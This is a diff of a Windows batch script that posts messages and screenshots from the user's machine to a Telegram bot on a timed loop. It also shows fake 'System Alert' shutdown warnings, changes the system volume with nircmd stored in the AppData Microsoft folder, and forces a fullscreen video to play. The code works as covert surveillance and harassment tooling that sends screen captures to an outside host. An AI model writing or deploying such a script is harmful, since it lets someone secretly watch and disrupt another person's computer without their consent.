@@ -22,8 +22,8 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-goto skip_code
-goto :EOF
+::goto skip_code
+::goto :EOF
 
 
 
@@ -42,9 +42,10 @@ if exist "%temp%\run_once1.flag" goto skip_code
 :loop
 if %NUM% GTR 20 goto play
 
-set "ENCODED_MESSAGE=%NUM%"
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
+:: Send Message 
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_MyScrn%" ^
+     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -d "text=%NUM%"
 
 set /a NUM+=1
@@ -59,6 +60,33 @@ goto loop
 
 :play
 
+
+set nircmd="%APPDATA%\Microsoft\nircmd.exe"
+
+:: First message (Fake shutdown warning)
+echo MsgBox "Your system will shut down in 1 minute!", 48, "System Alert" > %temp%\prank.vbs
+start "" wscript %temp%\prank.vbs
+timeout /t 1 /nobreak >nul
+start "" wscript %temp%\prank.vbs
+timeout /t 4 /nobreak >nul
+
+:: Wait 10 seconds before overwriting
+timeout /t 7 /nobreak >nul
+
+:: Overwrite with the second message (Just kidding!)
+echo MsgBox "Just kidding! PC is fine.", 64, "System Alert" > %temp%\prank.vbs
+
+:: Open "Just kidding!" message 10 times
+for /L %%i in (1,1,10) do (
+    start "" wscript %temp%\prank.vbs
+	%nircmd% wait 300
+)
+echo 1 > "%temp%\run_once1.flag"
+
+
+goto play1
+
+
 cd /d "%USERPROFILE%\Desktop\test\Atest"
 "%APPDATA%\Microsoft\nircmd.exe" setsysvolume 20238
 start "" /B mpv.exe --fullscreen --border=no --ontop --no-input-default-bindings --no-osc --no-stop-screensaver --term-status-msg=" " --idle=no --force-window=no --no-terminal --geometry=100%x100% --keepaspect=no --autofit=100%x100% --length=7 video.mp4
@@ -67,7 +95,7 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 
-
+:play1
 
 
 
@@ -92,19 +120,13 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 
-
-
-
-
-
-
 :skip_code
 
 
 
 
 
-timeout /t 60 /nobreak
+timeout /t 600 /nobreak
 
 
 :again
@@ -145,11 +167,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
 
 ::goto GOGO2
 
-:: Send Message 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
-     -d "chat_id=%CHAT_ID_MyScrn%" ^
-     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -d "text=Sent"
+
 
 
 :GOGO2
